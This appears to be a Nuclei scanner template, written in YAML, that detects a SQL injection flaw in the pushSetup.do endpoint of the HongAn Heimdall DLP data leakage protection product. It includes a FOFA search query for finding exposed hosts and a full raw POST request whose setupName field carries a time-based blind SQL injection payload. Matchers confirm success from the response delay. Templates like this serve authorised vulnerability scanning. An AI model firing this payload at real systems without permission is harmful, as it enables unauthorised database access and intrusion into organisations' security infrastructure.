id: hongan-heimdall-dlp-pushsetup-sqli

info:
  name: 虹安DLP数据泄漏防护系统pushSetup.do存在SQL注入漏洞
  author: onewin
  severity: high
  description: 虹安DLP数据泄漏防护系统pushSetup.do存在SQL注入漏洞
  metadata:
    fofa-query: product="HongAn-Heimdall-DLP" || body="userReg/initUserReg.do"
  tags: HONGAN-HEIMDALL-DLP Data Leakage Protection System

http:
  - raw:
      - |-
        @timeout: 30s
        POST /dlp/userReg/pushSetup.do HTTP/1.1
        Host: {{Hostname}}
        Priority: u=4
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

        setupName=1' AND (SELECT 6789 FROM (SELECT(SLEEP(5)))nxdq) AND 'vpUG'='vpUG

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
          - "status_code_1 == 200"
          - "contains(body, 'New Document')"
        condition: and
